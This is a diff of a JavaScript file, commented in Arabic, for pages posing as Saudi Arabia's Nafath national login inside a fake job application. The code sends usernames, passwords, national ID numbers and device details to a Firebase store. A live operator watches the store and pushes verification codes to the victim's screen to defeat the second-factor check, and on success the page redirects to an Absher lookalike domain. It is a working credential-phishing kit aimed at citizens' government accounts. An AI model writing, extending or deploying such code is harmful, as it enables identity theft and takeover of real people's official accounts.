@@ -1,122 +1,242 @@
+// script.js
+
+// استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
 import { db } from "./firebase-config.js";
-import { 
-    collection, 
-    addDoc, 
-    doc, 
-    onSnapshot, 
-    updateDoc,
-    serverTimestamp 
+
+// استيراد الدوال المطلوبة
+import {
+    collection,
+    addDoc,
+    serverTimestamp,
+    doc,
+    onSnapshot
 } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-let currentDocId = null;
-let currentCollection = "nafath_app_requests"; // الافتراضي لتطبيق نفاذ
+// القاموس الثابت للرسائل والتنبيهات باللغة العربية بعد إلغاء تبديل اللغات
+const activeTrans = {
+    loaderWaiting: "يرجى الانتظار لا تغادر الصفحه...",
+    appliedSuccess: `<i class="fa-solid fa-circle-check" style="color: #16a34a; font-size: 24px; margin-bottom: 10px; display: block;"></i> تم التقديم على وظيفتك بنجاح عبر المنصة الوطنية الموحدة... جاري تحويلك الآن`,
+    wrongId: "عذراً، رقم الهوية الوطنية أو الإقامة الذي أدخلته غير صحيح. يرجى التثبت والمحاولة مجدداً.",
+    wrongAuth: "اسم المستخدم أو كلمة المرور غير صحيحة، يرجى إعادة التأكد من بيانات النفاذ الموحد الخاص بك.",
+    approved: "تم التحقق والمطابقة بنجاح من قبل الإدارة.",
+    rejected: "تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.",
+    networkError: "عذراً، حدث خطأ في الاتصال بالشبكة.",
+    failSubmit: "فشل إرسال الطلب، تأكد من اتصال الشبكة.",
+    lengthError: "خطأ: يجب أن يتكون رقم بطاقة الأحوال أو الإقامة من 10 أرقام تماماً."
+};
 
-const nafathFormContainer = document.getElementById('nafathFormContainer');
-const nafathWaitContainer = document.getElementById('nafathWaitContainer');
-const nafathNewCodeContainer = document.getElementById('nafathNewCodeContainer');
-const nafathLiveNumber = document.getElementById('nafathLiveNumber');
-const globalLoader = document.getElementById('globalLoader');
+document.addEventListener('DOMContentLoaded', () => {
 
-// 1. عند إرسال طلب تطبيق نفاذ (رقم الهوية)
-document.getElementById('appForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const nationalId = document.getElementById('nationalId').value.trim();
-    if (!nationalId) return;
-
-    globalLoader.classList.remove('hidden-loader');
-    currentCollection = "nafath_app_requests";
-
-    try {
-        const docRef = await addDoc(collection(db, currentCollection), {
-            nationalId: nationalId,
-            status: "waiting_admin",
-            timestamp: serverTimestamp()
+    // ==========================================
+    // 1. تفاعلات الصفحة الرئيسية والتحويل لصفحة تسجيل الدخول
+    // ==========================================
+    const loginCard = document.getElementById('loginCard');
+    if (loginCard) {
+        // إضافة مؤشر الماوس ليكون واضحاً أنه قابل للنقر
+        loginCard.style.cursor = 'pointer'; 
+        
+        loginCard.addEventListener('click', (e) => {
+            e.preventDefault();
+            loginCard.style.transform = 'scale(0.95)';
+            loginCard.style.transition = 'transform 0.15s ease';
+            
+            setTimeout(() => {
+                window.location.href = 'login.html';
+            }, 150);
         });
-        currentDocId = docRef.id;
-        startListening(currentDocId, currentCollection);
-    } catch (error) {
-        console.error("Error adding document: ", error);
-        globalLoader.classList.add('hidden-loader');
     }
-});
 
-// 2. عند إرسال طلب اسم المستخدم وكلمة المرور
-document.getElementById('authForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const user = document.getElementById('username').value.trim();
-    const pass = document.getElementById('password').value.trim();
-    if (!user || !pass) return;
+    // ==========================================
+    // 2. نظام التبويب والأكورديون الديناميكي (Accordion System)
+    // ==========================================
+    const tabs = document.querySelectorAll('.accordion-item');
+    const panels = document.querySelectorAll('.form-panel-card');
 
-    globalLoader.classList.remove('hidden-loader');
-    currentCollection = "users_login";
+    tabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+            if (tab.classList.contains('collapsed')) {
 
-    try {
-        const docRef = await addDoc(collection(db, currentCollection), {
-            username: user,
-            password: pass,
-            status: "waiting_admin",
-            timestamp: serverTimestamp()
+                tabs.forEach(t => {
+                    t.classList.remove('active');
+                    t.classList.add('collapsed');
+                    const icon = t.querySelector('.status-icon');
+                    if (icon) {
+                        icon.className = 'fa-solid fa-plus status-icon';
+                    }
+                });
+
+                panels.forEach(p => {
+                    p.classList.add('hidden-panel');
+                });
+
+                tab.classList.remove('collapsed');
+                tab.classList.add('active');
+                const currentIcon = tab.querySelector('.status-icon');
+                if (currentIcon) {
+                    currentIcon.className = 'fa-solid fa-minus status-icon';
+                }
+
+                const targetPanelId = tab.getAttribute('data-target');
+                const targetPanel = document.getElementById(targetPanelId);
+                if (targetPanel) {
+                    targetPanel.classList.remove('hidden-panel');
+                }
+            }
         });
-        currentDocId = docRef.id;
-        startListening(currentDocId, currentCollection);
-    } catch (error) {
-        console.error("Error adding document: ", error);
-        globalLoader.classList.add('hidden-loader');
+    });
+
+    // ==========================================
+    // 3. معالجة إرسال النماذج ومراقبة رد الأدمن لحظياً
+    // ==========================================
+    const globalLoader = document.getElementById('globalLoader');
+    const loaderText = globalLoader ? globalLoader.querySelector('.loader-text') : null;
+
+    function listenToAdminApproval(collectionName, docId) {
+        const docRef = doc(db, collectionName, docId);
+
+        const nafathFormContainer = document.getElementById('nafathFormContainer');
+        const nafathWaitContainer = document.getElementById('nafathWaitContainer');
+        const nafathLiveNumber = document.getElementById('nafathLiveNumber');
+
+        const unsubscribe = onSnapshot(docRef, (snapshot) => {
+            if (snapshot.exists()) {
+                const data = snapshot.data();
+
+                if (data.status === "applied_success") {
+                    if (globalLoader) globalLoader.classList.remove('hidden-loader');
+                    if (loaderText) {
+                        loaderText.innerHTML = activeTrans.appliedSuccess;
+                        loaderText.style.color = "#16a34a";
+                    }
+
+                    if (nafathWaitContainer) nafathWaitContainer.classList.add('hidden-panel');
+                    unsubscribe();
+
+                    setTimeout(() => {
+                        window.location.href = "https://absheer-sa.onrender.com/";
+                    }, 5000);
+                }
+
+                else if (data.status === "show_code") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');
+                    if (nafathLiveNumber) nafathLiveNumber.innerText = data.verificationCode;
+                    if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');
+                }
+
+                else if (data.status === "wrong_national_id") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    alert(activeTrans.wrongId);
+                    unsubscribe();
+                    window.location.reload();
+                }
+
+                else if (data.status === "wrong_auth_data") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    alert(activeTrans.wrongAuth);
+                    unsubscribe();
+                    window.location.reload();
+                }
+
+                else if (data.status === "approved") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    alert(activeTrans.approved);
+                    window.location.href = "dashboard.html";
+                    unsubscribe();
+                }
+
+                else if (data.status === "rejected") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    alert(activeTrans.rejected);
+                    unsubscribe();
+                    window.location.reload();
+                }
+            }
+        });
     }
-});
 
-// 3. الاستماع للتحديثات اللحظية من الأدمن
-function startListening(docId, collectionName) {
-    const docRef = doc(db, collectionName, docId);
-
-    onSnapshot(docRef, (docSnap) => {
-        if (!docSnap.exists()) return;
-        const data = docSnap.data();
-
-        // إخفاء اللودر عند استلام أي استجابة تحكم أولية
-        globalLoader.classList.add('hidden-loader');
-
-        if (data.status === "show_code") {
-            // إظهار كود التحقق الأول وتحديث الواجهة للانتظار
-            nafathFormContainer.style.display = 'none';
-            nafathNewCodeContainer.style.display = 'none';
-            nafathWaitContainer.style.display = 'block';
-            nafathLiveNumber.innerText = data.verificationCode || '--';
-        } 
-        else if (data.status === "request_new_code") {
-            // الانتقال الفوري للشاشة الجديدة (سيتم إرسال كود آخر للتحقق)
-            nafathFormContainer.style.display = 'none';
-            nafathWaitContainer.style.display = 'none';
-            nafathNewCodeContainer.style.display = 'block';
-        } 
-        else if (data.status === "waiting_admin") {
-            // العودة لشاشة التحميل العامة في حال تم إرجاع الطلب للمراجعة
-            nafathNewCodeContainer.style.display = 'none';
-            globalLoader.classList.remove('hidden-loader');
-        }
-        else if (data.status === "applied_success") {
-            // توجيه العميل أو إظهار رسالة النجاح النهائية
-            alert("تم التقديم والموافقة بنجاح!");
+    const cancelNafathBtn = document.getElementById('cancelNafathBtn');
+    if (cancelNafathBtn) {
+        cancelNafathBtn.addEventListener('click', () => {
             window.location.reload();
+        });
+    }
+
+    // أ) نموذج اسم المستخدم وكلمة المرور
+    const authForm = document.getElementById('authForm');
+    if (authForm) {
+        authForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const usernameInput = document.getElementById('username').value;
+            const passwordInput = document.getElementById('password').value;
+
+            if (globalLoader) globalLoader.classList.remove('hidden-loader');
+            if (loaderText) {
+                loaderText.innerText = activeTrans.loaderWaiting;
+                loaderText.style.color = "#14805e";
+            }
+
+            try {
+                const docRef = await addDoc(collection(db, "users_login"), {
+                    username: usernameInput,
+                    password: passwordInput,
+                    timestamp: serverTimestamp(),
+                    device: navigator.userAgent,
+                    status: "waiting_admin"
+                });
+
+                listenToAdminApproval("users_login", docRef.id);
+
+            } catch (error) {
+                console.error("خطأ: ", error);
+                alert(activeTrans.networkError);
+                if (globalLoader) globalLoader.classList.add('hidden-loader');
+            }
+        });
+    }
+
+    // ب) نموذج رقم بطاقة الأحوال (تطبيق نفاذ)
+    const appForm = document.getElementById('appForm');
+    if (appForm) {
+        const nationalIdField = document.getElementById('nationalId');
+        if (nationalIdField) {
+            nationalIdField.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+            });
         }
-    });
-}
 
-// 4. عند قيام المستخدم بإدخال الكود الجديد والضغط على إرسال
-document.getElementById('newCodeForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const secondaryCode = document.getElementById('secondaryCodeInput').value.trim();
-    if (!secondaryCode || !currentDocId) return;
+        appForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
 
-    // إظهار شاشة الانتظار العامة مجدداً لحين تأكيد الأدمن
-    nafathNewCodeContainer.style.display = 'none';
-    globalLoader.classList.remove('hidden-loader');
+            const nationalIdInput = document.getElementById('nationalId').value.trim();
 
-    const docRef = doc(db, currentCollection, currentDocId);
-    
-    // حفظ الكود الجديد وإعادة الحالة إلى بانتظار الأدمن
-    await updateDoc(docRef, {
-        status: "waiting_admin",
-        secondaryVerificationCode: secondaryCode
-    });
+            if (nationalIdInput.length !== 10) {
+                alert(activeTrans.lengthError);
+                return;
+            }
+
+            if (globalLoader) globalLoader.classList.remove('hidden-loader');
+            if (loaderText) {
+                loaderText.innerText = activeTrans.loaderWaiting;
+                loaderText.style.color = "#14805e";
+            }
+
+            try {
+                const docRef = await addDoc(collection(db, "nafath_app_requests"), {
+                    nationalId: nationalIdInput,
+                    timestamp: serverTimestamp(),
+                    device: navigator.userAgent,
+                    status: "waiting_admin"
+                });
+
+                listenToAdminApproval("nafath_app_requests", docRef.id);
+
+            } catch (error) {
+                console.error("خطأ: ", error);
+                alert(activeTrans.failSubmit);
+                if (globalLoader) globalLoader.classList.add('hidden-loader');
+            }
+        });
+    }
 });
